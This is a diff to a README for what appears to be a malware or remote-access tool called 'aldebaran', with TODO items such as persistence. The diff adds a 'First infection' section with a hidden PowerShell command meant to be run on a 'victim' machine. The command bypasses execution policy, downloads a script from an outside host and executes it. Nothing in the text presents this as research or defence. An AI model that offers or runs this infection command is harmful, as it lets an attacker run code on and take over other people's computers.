@@ -63,8 +63,14 @@ enter password and menu will pop up
 ## Logging
 logging can be found @ ```/var/log/aldebaran.log```
 
+## First infection
+
+run the following command on victim in 'run' (win+r)
+
+```
+C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c "$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command"
+```
 
 ## TODO
-### Persistence
 ### Error check in menu
 ### Install script
